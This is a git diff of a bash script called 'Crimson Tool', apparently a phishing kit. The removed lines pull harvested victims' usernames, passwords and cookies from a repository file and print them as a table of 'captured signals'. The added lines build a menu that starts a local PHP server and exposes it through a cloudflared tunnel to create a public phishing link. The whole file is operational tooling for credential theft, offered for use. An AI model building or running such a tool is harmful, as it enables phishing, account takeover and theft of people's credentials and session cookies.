@@ -1,7 +1,12 @@
 #!/bin/bash
+# Crimson Tool - Chief Edition (Menu System)
+
 RED='\033[0;31m'
+GREEN='\033[0;32m'
 NC='\033[0m'
+
 clear
+# ASCII ART
 echo -e "${RED}"
 echo "██████╗  ██████╗ ██████╗ ██╗      ██████╗ ██╗  ██╗"
 echo "██╔══██╗██╔═══██╗██╔══██╗██║     ██╔═══██╗╚██╗██╔╝"
@@ -11,20 +16,28 @@ echo "██║  ██║╚██████╔╝██████╔╝█
 echo "╚═╝  ╚═╝ ╚═════╝ ╚═════╝ ╚══════╝ ╚═════╝ ╚═╝  ╚═╝"
 echo "             CHIEF OF CYBER SECURITY             "
 echo -e "${NC}"
-echo -e "${RED}[*] Syncing Cloud Signals...${NC}"
-git pull origin main --quiet
-touch master_archive.txt
-if [ -s "vault.txt" ]; then
-    cat vault.txt >> master_archive.txt
-    echo -n "" > vault.txt
-    git add vault.txt
-    git commit -m "Database Flush" --quiet
-    git push origin main --quiet
-    echo -e "${RED}[+] New Signals Captured!${NC}"
-fi
-echo -e "${RED}==============================================================${NC}"
-echo -e "${RED}      OFFLINE MASTER ARCHIVE (USER | PASS | COOKIE)           ${NC}"
-echo -e "${RED}==============================================================${NC}"
-printf "${RED}%-15s | %-12s | %-12s | %-s${NC}\n" "TIME" "USER" "PASS" "COOKIE"
-echo -e "${RED}--------------------------------------------------------------${NC}"
-column -t -s "|" master_archive.txt
+
+echo -e "${RED}[1] Create Phishing Link (via Cloudflared)${NC}"
+echo -e "${RED}[0] Exit Tool${NC}"
+echo -e "${RED}------------------------------------------------${NC}"
+read -p "Select Option: " choice
+
+case $choice in
+    1)
+        echo -e "${GREEN}[*] Starting local server on port 8080...${NC}"
+        # تشغيل السيرفر المحلي في الخلفية
+        php -S 127.0.0.1:8080 > /dev/null 2>&1 &
+        sleep 2
+        echo -e "${GREEN}[*] Launching Cloudflared Tunnel...${NC}"
+        # تشغيل كلاود فلير لإنشاء الرابط العالمي
+        cloudflared tunnel --url http://127.0.0.1:8080
+        ;;
+    0)
+        echo -e "${RED}[!] Exiting... Goodbye Chief.${NC}"
+        exit 0
+        ;;
+    *)
+        echo -e "${RED}[!] Invalid Option.${NC}"
+        bash sync.sh
+        ;;
+esac
